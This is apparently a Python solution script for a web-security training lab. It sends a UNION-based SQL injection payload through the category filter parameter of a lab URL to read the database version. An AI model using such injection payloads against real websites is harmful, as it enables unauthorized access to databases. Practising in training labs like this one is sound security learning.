import requests
import re
from colorama import Fore

LAB_URL="https://0af4009303667621839020b500d500e7.web-security-academy.net"

def main():
    print("[1] Injecting payload in " + Fore.YELLOW + "/category")
    payload = "1'UNION+select+null,@@version#"
    injection = fetch(f"/filter?category={payload}")

def fetch(path, cookies=None):
    try:
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=True)
    except:
        print("[1] Error fetching " + LAB_URL + path)

if __name__ == "__main__":
    main()


